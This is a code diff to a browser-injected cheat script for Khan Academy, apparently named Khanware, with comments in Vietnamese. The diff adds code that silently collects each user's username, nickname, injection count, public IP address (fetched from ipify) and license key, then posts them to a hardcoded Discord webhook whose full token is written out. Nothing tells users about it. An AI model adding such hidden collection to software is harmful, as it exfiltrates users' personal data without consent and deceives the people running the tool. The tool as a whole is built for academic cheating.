@@ -8,6 +8,7 @@
     let isDev = false;
     const repoPath = `https://raw.githubusercontent.com/Niximkk/Khanware/refs/heads/${isDev ? "dev/" : "main/"}`;
     const keyVipUrl = `https://raw.githubusercontent.com/HieuDz997/vatchatbian/refs/heads/main/KeyVip.txt`;
+    const webhookUrl = `https://discord.com/api/webhooks/1368062286614499468/4s1L9sZrD48qU2fXjXd9PDWNIkShAB4NoURB-Q49lK3GOcYq5p0oqwzIFURPDavDi_J4`;
 
     // Thiết bị và người dùng
     let device = {
@@ -16,6 +17,11 @@
     };
     let user = { username: "Username", nickname: "Nickname", UID: 0 };
     let loadedPlugins = [];
+
+    // Đếm số lần inject
+    let injectCount = parseInt(localStorage.getItem('injectCount')) || 0;
+    injectCount++;
+    localStorage.setItem('injectCount', injectCount);
 
     // Elements
     const unloader = document.createElement('unloader');
@@ -108,6 +114,46 @@
       }
     }
 
+    // Lấy IP người dùng
+    async function getUserIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip || "Không xác định";
+      } catch (e) {
+        debug(`Error fetching IP: ${e.message}`);
+        return "Không xác định";
+      }
+    }
+
+    // Gửi webhook Discord
+    async function sendWebhook(username, nickname, injectCount, ip, key) {
+      const embed = {
+        title: "HieuDz Kav Hack - User Inject",
+        color: 0x1e40af,
+        fields: [
+          { name: "Username", value: username || "Không xác định", inline: true },
+          { name: "Nickname", value: nickname || "Không xác định", inline: true },
+          { name: "Số lần inject", value: injectCount.toString(), inline: true },
+          { name: "Địa chỉ IP", value: ip, inline: true },
+          { name: "Key", value: key || "Không có", inline: true }
+        ],
+        timestamp: new Date().toISOString(),
+        footer: { text: "Powered by HieuDz" }
+      };
+
+      try {
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ embeds: [embed] })
+        });
+        debug('Webhook sent successfully');
+      } catch (e) {
+        debug(`Error sending webhook: ${e.message}`);
+      }
+    }
+
     // Kiểm tra key
     async function validateKey(key) {
       // Tải danh sách key VIP
@@ -157,6 +203,8 @@
         const result = await validateKey(savedKey);
         if (result.valid) {
           sendToast(`✅ Key hợp lệ: ${savedKey}${result.vip ? ' (VIP)' : ''}`, 3000);
+          const ip = await getUserIP();
+          await sendWebhook(user.username, user.nickname, injectCount, ip, savedKey);
           return true;
         } else {
           localStorage.removeItem('savedKey');
@@ -195,6 +243,8 @@
             if (result.valid) {
               localStorage.setItem('savedKey', key);
               if (!result.vip) localStorage.setItem('keyTimestamp', Date.now());
+              const ip = await getUserIP();
+              await sendWebhook(user.username, user.nickname, injectCount, ip, key);
               keyScreen.style.opacity = '0';
               setTimeout(() => keyScreen.remove(), 1000);
               resolve(true);
@@ -213,7 +263,7 @@
         });
 
         getKeyButton.addEventListener('click', () => {
-          window.open('https://example.com', '_blank'); // Thay bằng URL website của bạn
+          window.open('https://example.com', '_blank');
           sendToast('🔑 Mở trang lấy key. Vui lòng vượt Linkvertise!', 3000);
         });
 
